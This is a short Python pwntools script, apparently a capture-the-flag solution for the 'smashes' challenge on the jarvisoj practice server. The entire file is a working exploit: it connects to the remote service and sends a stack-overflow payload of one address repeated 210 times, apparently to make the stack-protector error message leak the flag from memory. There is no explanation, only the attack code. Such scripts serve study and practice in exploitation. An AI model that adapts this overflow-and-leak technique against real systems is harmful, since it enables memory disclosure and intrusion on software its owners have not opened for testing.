#!/usr/bin/env python
# -*-coding=utf-8-*-
from pwn import *
import time
context.log_level = 'debug'
# io = process("smashes")
io = remote("pwn.jarvisoj.com",9877)
payload = p64(0x400d20) * 210
io.recvuntil("name?")
io.sendline(payload)
io.recvuntil("flag: ")
io.sendline()
io.recv()
time.sleep(0.5)
